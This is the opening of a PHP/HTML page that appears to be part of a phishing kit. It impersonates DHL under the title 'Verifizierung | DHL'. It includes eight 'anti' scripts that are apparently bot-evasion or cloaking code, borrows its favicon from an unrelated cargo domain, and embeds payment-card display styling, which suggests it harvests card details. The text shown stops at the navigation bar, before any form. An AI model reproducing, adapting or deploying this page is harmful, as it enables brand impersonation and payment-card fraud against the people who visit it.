<?php
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";
include "anti/anti8.php";
session_start();
?>
<html lang="fr"><head>
        <link rel="stylesheet" href=
"https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
        integrity=
"sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh"
        crossorigin="anonymous">
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="session_hash" content="745a1f30e1099b667ae475ead520bb38">
    <meta name="visit_id" content="204">
        <link rel="stylesheet" href="assets/app.css">
    <style>
.fuckyou input{
  float:left;
}
.fuckyou button{
  float:left;
}
.summary-card {
    background: #E9E9E9;
    color: #a1a1a1;
    border: none;
    box-shadow: none;
}

.summary-card > .card-body > .row {
    padding-top: .75rem;
    padding-bottom: .5rem;
}

.summary-card > .card-body > .row:not(:last-child) {
    border-bottom: 1px solid #fff;
}

.summary-card .row-icon {
    font-size: 25px;
    margin-right: .75rem;
}

.parsley-errors-list + .flag-dropdown {
    top: -17px;
}

.parsley-errors-list.filled + .flag-dropdown {
    top: -30px;
}

.country-select.inside input {
    padding: .5rem !important;
}

.country-col .country-select.inside {
    display: block !important;
}

.country-col .country-select.inside .form-control {
    width: 100%;
}

.summary-table td, .summary-table th {
    padding: .35rem;
    border-top: 0;
    border-bottom: 1px solid #aaaeb3;
}

.summary-table th {
    border: 0;
}

@media (max-width: 768px) {
    .container {
        max-width: 100vw;
    }

    .kQwli, .rtYhf {
        padding-top: 30px !important;
    }

    .card-head {
        font-weight: 600;
    }

    .card-head::after {
        display: block;
    }
}
</style>

    <title>Verifizierung | DHL</title>
    <link rel="icon" type="image/ico" href="https://dispatching-centre.lasamericascargo.com/images/favicon.gif">
  <script src="https://cdn.lr-in.com/logger-1.min.js" async=""></script><style>.jp-card.jp-card-safari.jp-card-identified .jp-card-front:before,.jp-card.jp-card-safari.jp-card-identified .jp-card-back:before{background-image:repeating-linear-gradient(45deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-linear-gradient(135deg, rgba(255,255,255,0.05) 1px, rgba(255,255,255,0) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.03) 4px),repeating-linear-gradient(90deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-linear-gradient(210deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),-webkit-linear-gradient(-245deg, rgba(255,255,255,0) 50%,rgba(255,255,255,0.2) 70%,rgba(255,255,255,0) 90%);background-image:repeating-linear-gradient(45deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-linear-gradient(135deg, rgba(255,255,255,0.05) 1px, rgba(255,255,255,0) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.03) 4px),repeating-linear-gradient(90deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-linear-gradient(210deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),linear-gradient(-25deg, rgba(255,255,255,0) 50%,rgba(255,255,255,0.2) 70%,rgba(255,255,255,0) 90%)}.jp-card.jp-card-ie-10.jp-card-flipped,.jp-card.jp-card-ie-11.jp-card-flipped{-webkit-transform:0deg;-moz-transform:0deg;-ms-transform:0deg;-o-transform:0deg;transform:0deg}.jp-card.jp-card-ie-10.jp-card-flipped .jp-card-front,.jp-card.jp-card-ie-11.jp-card-flipped .jp-card-front{-webkit-transform:rotateY(0deg);-moz-transform:rotateY(0deg);-ms-transform:rotateY(0deg);-o-transform:rotateY(0deg);transform:rotateY(0deg)}.jp-card.jp-card-ie-10.jp-card-flipped .jp-card-back,.jp-card.jp-card-ie-11.jp-card-flipped .jp-card-back{-webkit-transform:rotateY(0deg);-moz-transform:rotateY(0deg);-ms-transform:rotateY(0deg);-o-transform:rotateY(0deg);transform:rotateY(0deg)}.jp-card.jp-card-ie-10.jp-card-flipped .jp-card-back:after,.jp-card.jp-card-ie-11.jp-card-flipped .jp-card-back:after{left:18%}.jp-card.jp-card-ie-10.jp-card-flipped .jp-card-back .jp-card-cvc,.jp-card.jp-card-ie-11.jp-card-flipped .jp-card-back .jp-card-cvc{-webkit-transform:rotateY(180deg);-moz-transform:rotateY(180deg);-ms-transform:rotateY(180deg);-o-transform:rotateY(180deg);transform:rotateY(180deg);left:5%}.jp-card.jp-card-ie-10.jp-card-flipped .jp-card-back .jp-card-shiny,.jp-card.jp-card-ie-11.jp-card-flipped .jp-card-back .jp-card-shiny{left:84%}.jp-card.jp-card-ie-10.jp-card-flipped .jp-card-back .jp-card-shiny:after,.jp-card.jp-card-ie-11.jp-card-flipped .jp-card-back .jp-card-shiny:after{left:-480%;-webkit-transform:rotateY(180deg);-moz-transform:rotateY(180deg);-ms-transform:rotateY(180deg);-o-transform:rotateY(180deg);transform:rotateY(180deg)}.jp-card.jp-card-ie-10.jp-card-amex .jp-card-back,.jp-card.jp-card-ie-11.jp-card-amex .jp-card-back{display:none}.jp-card-logo{height:36px;width:60px;font-style:italic}.jp-card-logo,.jp-card-logo:before,.jp-card-logo:after{box-sizing:border-box}.jp-card-logo.jp-card-amex{text-transform:uppercase;font-size:4px;font-weight:bold;color:white;background-image:repeating-radial-gradient(circle at center, #fff 1px, #999 2px);background-image:repeating-radial-gradient(circle at center, #fff 1px, #999 2px);border:1px solid #EEE}.jp-card-logo.jp-card-amex:before,.jp-card-logo.jp-card-amex:after{width:28px;display:block;position:absolute;left:16px}.jp-card-logo.jp-card-amex:before{height:28px;content:"american";top:3px;text-align:left;padding-left:2px;padding-top:11px;background:#267AC3}.jp-card-logo.jp-card-amex:after{content:"express";bottom:11px;text-align:right;padding-right:2px}.jp-card.jp-card-amex.jp-card-flipped{-webkit-transform:none;-moz-transform:none;-ms-transform:none;-o-transform:none;transform:none}.jp-card.jp-card-amex.jp-card-identified .jp-card-front:before,.jp-card.jp-card-amex.jp-card-identified .jp-card-back:before{background-color:#108168}.jp-card.jp-card-amex.jp-card-identified .jp-card-front .jp-card-logo.jp-card-amex{opacity:1}.jp-card.jp-card-amex.jp-card-identified .jp-card-front .jp-card-cvc{visibility:visible}.jp-card.jp-card-amex.jp-card-identified .jp-card-front:after{opacity:1}.jp-card-logo.jp-card-discover{background:#f60;color:#111;text-transform:uppercase;font-style:normal;font-weight:bold;font-size:10px;text-align:center;overflow:hidden;z-index:1;padding-top:9px;letter-spacing:.03em;border:1px solid #EEE}.jp-card-logo.jp-card-discover:before,.jp-card-logo.jp-card-discover:after{content:" ";display:block;position:absolute}.jp-card-logo.jp-card-discover:before{background:white;width:200px;height:200px;border-radius:200px;bottom:-5%;right:-80%;z-index:-1}.jp-card-logo.jp-card-discover:after{width:8px;height:8px;border-radius:4px;top:10px;left:27px;background-color:#f60;background-image:-webkit-radial-gradient(#f60,#fff);background-image:radial-gradient(  #f60,#fff);content:"network";font-size:4px;line-height:24px;text-indent:-7px}.jp-card .jp-card-front .jp-card-logo.jp-card-discover{right:12%;top:18%}.jp-card.jp-card-discover.jp-card-identified .jp-card-front:before,.jp-card.jp-card-discover.jp-card-identified .jp-card-back:before{background-color:#86B8CF}.jp-card.jp-card-discover.jp-card-identified .jp-card-logo.jp-card-discover{opacity:1}.jp-card.jp-card-discover.jp-card-identified .jp-card-front:after{-webkit-transition:400ms;-moz-transition:400ms;transition:400ms;content:" ";display:block;background-color:#f60;background-image:-webkit-linear-gradient(#f60,#ffa366,#f60);background-image:linear-gradient(#f60,#ffa366,#f60);height:50px;width:50px;border-radius:25px;position:absolute;left:100%;top:15%;margin-left:-25px;box-shadow:inset 1px 1px 3px 1px rgba(0,0,0,0.5)}.jp-card-logo.jp-card-unionpay{width:60px;display:block;height:40px;background:#e21836;-webkit-transform:skew(-15deg);-moz-transform:skew(20deg);-o-transform:skew(20deg);border-radius:5px;font-size:10px;z-index:1;line-height:33px;color:#fff;text-align:center;font-family:"Sans-serif", "Microsoft Yahei", "\5FAE\8F6F\96C5\9ED1", "Hiragino Sans", "Gulim", "\5B8B\4F53";font-weight:bold}.jp-card-logo.jp-card-unionpay:after,.jp-card-logo.jp-card-unionpay:before{display:block;margin:0 auto;position:absolute;height:40px;top:0;z-index:-1}.jp-card-logo.jp-card-unionpay:before{content:" ";width:28px;background:#00447c;left:14px;border-top-left-radius:5px;border-bottom-left-radius:5px}.jp-card-logo.jp-card-unionpay:after{content:"银联";width:26px;background:#007b84;left:34px;border-radius:5px;font-size:10px;line-height:54px;text-indent:-17px}.jp-card.jp-card-unionpay.jp-card-identified .jp-card-back:before,.jp-card.jp-card-unionpay.jp-card-identified .jp-card-front:before{background-color:#987c00}.jp-card.jp-card-unionpay.jp-card-identified .jp-card-logo.jp-card-unionpay{opacity:1}.jp-card-logo.jp-card-visa{text-transform:uppercase;color:white;text-align:center;font-weight:bold;font-size:24px;line-height:18px;margin-top:5px}.jp-card-logo.jp-card-visa:before,.jp-card-logo.jp-card-visa:after{content:" ";display:block;width:100%;height:25%}.jp-card-logo.jp-card-visa:before{position:absolute;left:-4px;width:0;height:0;border-style:solid;border-width:0 12px 6px 0;border-color:transparent #ffffff transparent transparent}.jp-card.jp-card-visa.jp-card-identified .jp-card-front:before,.jp-card.jp-card-visa.jp-card-identified .jp-card-back:before{background-color:#191278}.jp-card.jp-card-visa.jp-card-identified .jp-card-logo.jp-card-visa{opacity:1;box-shadow:none}.jp-card-logo.jp-card-visaelectron{background:white;text-transform:uppercase;color:#1A1876;text-align:center;font-weight:bold;font-size:15px;line-height:18px}.jp-card-logo.jp-card-visaelectron:before,.jp-card-logo.jp-card-visaelectron:after{content:" ";display:block;width:100%;height:25%}.jp-card-logo.jp-card-visaelectron:before{background:#1A1876}.jp-card-logo.jp-card-visaelectron:after{background:#E79800}.jp-card-logo.jp-card-visaelectron .elec{float:right;font-family:arial;font-size:9px;margin-right:1px;margin-top:-5px;text-transform:none}.jp-card.jp-card-visaelectron.jp-card-identified .jp-card-front:before,.jp-card.jp-card-visaelectron.jp-card-identified .jp-card-back:before{background-color:#191278}.jp-card.jp-card-visaelectron.jp-card-identified .jp-card-logo.jp-card-visaelectron{opacity:1}.jp-card-logo.jp-card-mastercard{color:white;font-style:normal;text-transform:lowercase;font-weight:bold;text-align:center;font-size:9px;line-height:84px;z-index:1;text-shadow:1px 1px rgba(0,0,0,0.6)}.jp-card-logo.jp-card-mastercard:before,.jp-card-logo.jp-card-mastercard:after{content:" ";display:block;width:36px;top:0;position:absolute;height:36px;border-radius:18px}.jp-card-logo.jp-card-mastercard:before{left:0;background:#EB001B;z-index:-1;opacity:0.9}.jp-card-logo.jp-card-mastercard:after{right:0;background:#FF5F00;z-index:-2}.jp-card.jp-card-mastercard.jp-card-identified .jp-card-front .jp-card-logo.jp-card-mastercard,.jp-card.jp-card-mastercard.jp-card-identified .jp-card-back .jp-card-logo.jp-card-mastercard{box-shadow:none}.jp-card.jp-card-mastercard.jp-card-identified .jp-card-front:before,.jp-card.jp-card-mastercard.jp-card-identified .jp-card-back:before{background-color:#0061A8}.jp-card.jp-card-mastercard.jp-card-identified .jp-card-logo.jp-card-mastercard{opacity:1}.jp-card-logo.jp-card-maestro{color:white;font-style:normal;text-transform:lowercase;font-weight:bold;text-align:center;font-size:14px;line-height:84px;z-index:1;text-shadow:1px 1px rgba(0,0,0,0.6)}.jp-card-logo.jp-card-maestro:before,.jp-card-logo.jp-card-maestro:after{content:" ";display:block;width:36px;top:0;position:absolute;height:36px;border-radius:18px}.jp-card-logo.jp-card-maestro:before{left:0;background:#EB001B;z-index:-2}.jp-card-logo.jp-card-maestro:after{right:0;background:#00A2E5;z-index:-1;opacity:0.8}.jp-card.jp-card-maestro.jp-card-identified .jp-card-front .jp-card-logo.jp-card-maestro,.jp-card.jp-card-maestro.jp-card-identified .jp-card-back .jp-card-logo.jp-card-maestro{box-shadow:none}.jp-card.jp-card-maestro.jp-card-identified .jp-card-front:before,.jp-card.jp-card-maestro.jp-card-identified .jp-card-back:before{background-color:#0B2C5F}.jp-card.jp-card-maestro.jp-card-identified .jp-card-logo.jp-card-maestro{opacity:1}.jp-card-logo.jp-card-dankort{width:60px;height:36px;padding:3px;border-radius:8px;border:#000 1px solid;background-color:#fff}.jp-card-logo.jp-card-dankort .dk{position:relative;width:100%;height:100%;overflow:hidden}.jp-card-logo.jp-card-dankort .dk:before{background-color:#ED1C24;content:'';position:absolute;width:100%;height:100%;display:block;border-radius:6px}.jp-card-logo.jp-card-dankort .dk:after{content:'';position:absolute;top:50%;margin-top:-7.7px;right:0;width:0;height:0;border-style:solid;border-width:7px 7px 10px 0;border-color:transparent #ED1C24 transparent transparent;z-index:1}.jp-card-logo.jp-card-dankort .d,.jp-card-logo.jp-card-dankort .k{position:absolute;top:50%;width:50%;display:block;height:15.4px;margin-top:-7.7px;background:white}.jp-card-logo.jp-card-dankort .d{left:0;border-radius:0 8px 10px 0}.jp-card-logo.jp-card-dankort .d:before{content:'';position:absolute;top:50%;left:50%;display:block;background:#ED1C24;border-radius:2px 4px 6px 0px;height:5px;width:7px;margin:-3px 0 0 -4px}.jp-card-logo.jp-card-dankort .k{right:0}.jp-card-logo.jp-card-dankort .k:before,.jp-card-logo.jp-card-dankort .k:after{content:'';position:absolute;right:50%;width:0;height:0;border-style:solid;margin-right:-1px}.jp-card-logo.jp-card-dankort .k:before{top:0;border-width:8px 5px 0 0;border-color:#ED1C24 transparent transparent transparent}.jp-card-logo.jp-card-dankort .k:after{bottom:0;border-width:0 5px 8px 0;border-color:transparent transparent #ED1C24 transparent}.jp-card.jp-card-dankort.jp-card-identified .jp-card-front:before,.jp-card.jp-card-dankort.jp-card-identified .jp-card-back:before{background-color:#0055C7}.jp-card.jp-card-dankort.jp-card-identified .jp-card-logo.jp-card-dankort{opacity:1}.jp-card-logo.jp-card-elo{height:50px;width:50px;border-radius:100%;background:black;color:white;text-align:center;text-transform:lowercase;font-size:21px;font-style:normal;letter-spacing:1px;font-weight:bold;padding-top:13px}.jp-card-logo.jp-card-elo .e,.jp-card-logo.jp-card-elo .l,.jp-card-logo.jp-card-elo .o{display:inline-block;position:relative}.jp-card-logo.jp-card-elo .e{-webkit-transform:rotate(-15deg);-moz-transform:rotate(-15deg);-ms-transform:rotate(-15deg);-o-transform:rotate(-15deg);transform:rotate(-15deg)}.jp-card-logo.jp-card-elo .o{position:relative;display:inline-block;width:12px;height:12px;right:0;top:7px;border-radius:100%;background-image:-webkit-linear-gradient( #ff0 50%,red 50%);background-image:linear-gradient( #ff0 50%,red 50%);-webkit-transform:rotate(40deg);-moz-transform:rotate(40deg);-ms-transform:rotate(40deg);-o-transform:rotate(40deg);transform:rotate(40deg);text-indent:-9999px}.jp-card-logo.jp-card-elo .o:before{content:"";position:absolute;width:49%;height:49%;background:black;border-radius:100%;text-indent:-99999px;top:25%;left:25%}.jp-card.jp-card-elo.jp-card-identified .jp-card-front:before,.jp-card.jp-card-elo.jp-card-identified .jp-card-back:before{background-color:#6F6969}.jp-card.jp-card-elo.jp-card-identified .jp-card-logo.jp-card-elo{opacity:1}.jp-card-logo.jp-card-jcb{border-radius:5px 0px 5px 0px;-moz-border-radius:5px 0px 5px 0px;-webkit-border-radius:5px 0px 5px 0px;background-color:white;font-style:normal;color:white;width:50px;padding:2px 0 0 2px}.jp-card-logo.jp-card-jcb>div{width:15px;margin-right:1px;display:inline-block;text-align:center;text-shadow:1px 1px rgba(0,0,0,0.6);border-radius:5px 0px 5px 0px;-moz-border-radius:5px 0px 5px 0px;-webkit-border-radius:5px 0px 5px 0px}.jp-card-logo.jp-card-jcb>div:before,.jp-card-logo.jp-card-jcb>div:after{content:" ";display:block;height:8px}.jp-card-logo.jp-card-jcb>div.j{background-color:#000063;background-image:-webkit-linear-gradient(left, #000063,#008cff);background-image:linear-gradient(to right,#000063,#008cff)}.jp-card-logo.jp-card-jcb>div.c{background-color:#630000;background-image:-webkit-linear-gradient(left, #630000,#ff008d);background-image:linear-gradient(to right,#630000,#ff008d)}.jp-card-logo.jp-card-jcb>div.b{background-color:#006300;background-image:-webkit-linear-gradient(left, #006300,lime);background-image:linear-gradient(to right,#006300,lime)}.jp-card.jp-card-jcb.jp-card-identified .jp-card-front:before,.jp-card.jp-card-jcb.jp-card-identified .jp-card-back:before{background-color:#CB8000}.jp-card.jp-card-jcb.jp-card-identified .jp-card-logo.jp-card-jcb{opacity:1;box-shadow:none}.jp-card-logo.jp-card-dinersclub{font-family:serif;height:40px;width:100px;color:white;font-size:17px;font-style:normal;letter-spacing:1px}.jp-card-logo.jp-card-dinersclub::before,.jp-card-logo.jp-card-dinersclub::after{display:block;position:relative}.jp-card-logo.jp-card-dinersclub::before{content:'Diners Club'}.jp-card-logo.jp-card-dinersclub::after{content:'International';text-transform:uppercase;font-size:0.6em}.jp-card.jp-card-dinersclub .jp-card-front .jp-card-logo{box-shadow:none !important}.jp-card.jp-card-dinersclub.jp-card-identified .jp-card-front:before,.jp-card.jp-card-dinersclub.jp-card-identified .jp-card-back:before{background-color:#999}.jp-card.jp-card-dinersclub.jp-card-identified .jp-card-logo.jp-card-dinersclub{opacity:1}.jp-card-logo.jp-card-hipercard{height:20px;width:100px;color:white;font-size:21px;font-style:italic;font-weight:bold}.jp-card-logo.jp-card-hipercard::before,.jp-card-logo.jp-card-hipercard::after{display:block;position:relative}.jp-card.jp-card-hipercard.jp-card-identified .jp-card-front:before,.jp-card.jp-card-hipercard.jp-card-identified .jp-card-back:before{background-color:#770304}.jp-card.jp-card-hipercard.jp-card-identified .jp-card-logo.jp-card-hipercard{opacity:1;box-shadow:none}.jp-card-logo.jp-card-troy{text-transform:lowercase;color:#fff;text-align:center;font-weight:700;font-size:24px;line-height:18px;margin-top:5px}.jp-card-logo.jp-card-troy:before,.jp-card-logo.jp-card-troy:after{content:\"\";display:block;width:26%;height:6%;background:#22b8c3;right:32%;top:24%;position:absolute;transform:rotate(105deg)}.jp-card.jp-card-troy.jp-card-identified .jp-card-front:before,.jp-card.jp-card-troy.jp-card-identified .jp-card-back:before{background-color:#01adba}.jp-card.jp-card-troy.jp-card-identified .jp-card-logo.jp-card-troy{opacity:1;box-shadow:none}.jp-card-container{-webkit-perspective:1000px;-moz-perspective:1000px;perspective:1000px;width:350px;max-width:100%;height:200px;margin:auto;z-index:1;position:relative}.jp-card{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;line-height:1;position:relative;width:100%;height:100%;min-width:315px;border-radius:10px;-webkit-transform-style:preserve-3d;-moz-transform-style:preserve-3d;-ms-transform-style:preserve-3d;-o-transform-style:preserve-3d;transform-style:preserve-3d;-webkit-transition:all 400ms linear;-moz-transition:all 400ms linear;transition:all 400ms linear}.jp-card>*,.jp-card>*:after,.jp-card>*:before{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box;font-family:inherit}.jp-card.jp-card-flipped{-webkit-transform:rotateY(180deg);-moz-transform:rotateY(180deg);-ms-transform:rotateY(180deg);-o-transform:rotateY(180deg);transform:rotateY(180deg)}.jp-card .jp-card-back,.jp-card .jp-card-front{-webkit-backface-visibility:hidden;backface-visibility:hidden;-webkit-transform-style:preserve-3d;-moz-transform-style:preserve-3d;-ms-transform-style:preserve-3d;-o-transform-style:preserve-3d;transform-style:preserve-3d;-webkit-transition:all 400ms linear;-moz-transition:all 400ms linear;transition:all 400ms linear;width:100%;height:100%;position:absolute;top:0;left:0;overflow:hidden;border-radius:10px;background:#ddd}.jp-card .jp-card-back:before,.jp-card .jp-card-front:before{content:" ";display:block;position:absolute;width:100%;height:100%;top:0;left:0;opacity:0;border-radius:10px;-webkit-transition:all 400ms ease;-moz-transition:all 400ms ease;transition:all 400ms ease}.jp-card .jp-card-back:after,.jp-card .jp-card-front:after{content:" ";display:block}.jp-card .jp-card-back .jp-card-display,.jp-card .jp-card-front .jp-card-display{color:#fff;font-weight:normal;opacity:0.5;-webkit-transition:opacity 400ms linear;-moz-transition:opacity 400ms linear;transition:opacity 400ms linear}.jp-card .jp-card-back .jp-card-display.jp-card-focused,.jp-card .jp-card-front .jp-card-display.jp-card-focused{opacity:1;font-weight:700}.jp-card .jp-card-back .jp-card-cvc,.jp-card .jp-card-front .jp-card-cvc{font-family:"Bitstream Vera Sans Mono",Consolas,Courier,monospace;font-size:14px}.jp-card .jp-card-back .jp-card-shiny,.jp-card .jp-card-front .jp-card-shiny{width:50px;height:35px;border-radius:5px;background:#ccc;position:relative}.jp-card .jp-card-back .jp-card-shiny:before,.jp-card .jp-card-front .jp-card-shiny:before{content:" ";display:block;width:70%;height:60%;border-top-right-radius:5px;border-bottom-right-radius:5px;background:#d9d9d9;position:absolute;top:20%}.jp-card .jp-card-front .jp-card-logo{position:absolute;opacity:0;right:5%;top:8%;-webkit-transition:400ms;-moz-transition:400ms;transition:400ms}.jp-card .jp-card-front .jp-card-lower{width:80%;position:absolute;left:10%;bottom:30px}@media only screen and (max-width: 480px){.jp-card .jp-card-front .jp-card-lower{width:90%;left:5%}}.jp-card .jp-card-front .jp-card-lower .jp-card-cvc{visibility:hidden;float:right;position:relative;bottom:5px}.jp-card .jp-card-front .jp-card-lower .jp-card-number{font-family:"Bitstream Vera Sans Mono",Consolas,Courier,monospace;font-size:24px;clear:both;margin-bottom:30px}.jp-card .jp-card-front .jp-card-lower .jp-card-expiry{font-family:"Bitstream Vera Sans Mono",Consolas,Courier,monospace;letter-spacing:0;position:relative;float:right;width:25%}.jp-card .jp-card-front .jp-card-lower .jp-card-expiry:after,.jp-card .jp-card-front .jp-card-lower .jp-card-expiry:before{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-weight:bold;font-size:7px;white-space:pre;display:block;opacity:0.5}.jp-card .jp-card-front .jp-card-lower .jp-card-expiry:before{content:attr(data-before);margin-bottom:2px;font-size:7px;text-transform:uppercase}.jp-card .jp-card-front .jp-card-lower .jp-card-expiry:after{position:absolute;content:attr(data-after);text-align:right;right:100%;margin-right:5px;margin-top:2px;bottom:0}.jp-card .jp-card-front .jp-card-lower .jp-card-name{text-transform:uppercase;font-family:"Bitstream Vera Sans Mono",Consolas,Courier,monospace;font-size:20px;max-height:45px;position:absolute;bottom:0;width:190px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:horizontal;overflow:hidden;text-overflow:ellipsis}.jp-card .jp-card-back{-webkit-transform:rotateY(180deg);-moz-transform:rotateY(180deg);-ms-transform:rotateY(180deg);-o-transform:rotateY(180deg);transform:rotateY(180deg)}.jp-card .jp-card-back .jp-card-bar{background-color:#444;background-image:-webkit-linear-gradient(#444,#333);background-image:linear-gradient(#444,#333);width:100%;height:20%;position:absolute;top:10%}.jp-card .jp-card-back:after{content:" ";display:block;background-color:#fff;background-image:-webkit-linear-gradient(#fff,#fff);background-image:linear-gradient(#fff,#fff);width:80%;height:16%;position:absolute;top:40%;left:2%}.jp-card .jp-card-back .jp-card-cvc{position:absolute;top:40%;left:85%;-webkit-transition-delay:600ms;-moz-transition-delay:600ms;transition-delay:600ms}.jp-card .jp-card-back .jp-card-shiny{position:absolute;top:66%;left:2%}.jp-card .jp-card-back .jp-card-shiny:after{content:"This card has been issued by Jesse Pollak and is licensed for anyone to use anywhere for free. It comes with no warranty. For support issues, please visit: github.com/jessepollak/card.";position:absolute;left:120%;top:5%;color:white;font-size:7px;width:230px;opacity:0.5}.jp-card.jp-card-identified{box-shadow:0 0 20px rgba(0,0,0,0.3)}.jp-card.jp-card-identified .jp-card-back,.jp-card.jp-card-identified .jp-card-front{background-color:#000;background-color:rgba(0,0,0,0.5)}.jp-card.jp-card-identified .jp-card-back:before,.jp-card.jp-card-identified .jp-card-front:before{-webkit-transition:all 400ms ease;-moz-transition:all 400ms ease;transition:all 400ms ease;background-image:repeating-linear-gradient(45deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-linear-gradient(135deg, rgba(255,255,255,0.05) 1px, rgba(255,255,255,0) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.03) 4px),repeating-linear-gradient(90deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-linear-gradient(210deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-radial-gradient(circle at 30% 30%, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-radial-gradient(circle at 70% 70%, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-radial-gradient(circle at 90% 20%, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-radial-gradient(circle at 15% 80%, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),-webkit-linear-gradient(-245deg, rgba(255,255,255,0) 50%,rgba(255,255,255,0.2) 70%,rgba(255,255,255,0) 90%);background-image:repeating-linear-gradient(45deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-linear-gradient(135deg, rgba(255,255,255,0.05) 1px, rgba(255,255,255,0) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.03) 4px),repeating-linear-gradient(90deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-linear-gradient(210deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-radial-gradient(circle at 30% 30%, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-radial-gradient(circle at 70% 70%, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-radial-gradient(circle at 90% 20%, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-radial-gradient(circle at 15% 80%, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),linear-gradient(-25deg, rgba(255,255,255,0) 50%,rgba(255,255,255,0.2) 70%,rgba(255,255,255,0) 90%);opacity:1}.jp-card.jp-card-identified .jp-card-back .jp-card-logo,.jp-card.jp-card-identified .jp-card-front .jp-card-logo{box-shadow:0 0 0 2px rgba(255,255,255,0.3)}.jp-card.jp-card-identified.no-radial-gradient .jp-card-back:before,.jp-card.jp-card-identified.no-radial-gradient .jp-card-front:before{background-image:repeating-linear-gradient(45deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-linear-gradient(135deg, rgba(255,255,255,0.05) 1px, rgba(255,255,255,0) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.03) 4px),repeating-linear-gradient(90deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-linear-gradient(210deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),-webkit-linear-gradient(-245deg, rgba(255,255,255,0) 50%,rgba(255,255,255,0.2) 70%,rgba(255,255,255,0) 90%);background-image:repeating-linear-gradient(45deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-linear-gradient(135deg, rgba(255,255,255,0.05) 1px, rgba(255,255,255,0) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.03) 4px),repeating-linear-gradient(90deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),repeating-linear-gradient(210deg, rgba(255,255,255,0) 1px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.05) 4px),linear-gradient(-25deg, rgba(255,255,255,0) 50%,rgba(255,255,255,0.2) 70%,rgba(255,255,255,0) 90%)}@media (max-width: 450px){.card-wrapper{max-width:80vw;width:100%;margin:20px auto;overflow-x:hidden}.card-wrapper>.jp-card-container{transform:scale(0.625);transform-origin:left center}}
</style></head>
  <body data-aos-easing="ease" data-aos-duration="1000" data-aos-delay="0" style="margin: 0;">
  <div class="se-pre-con" style="display: none;"></div>
    <header class="header">
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
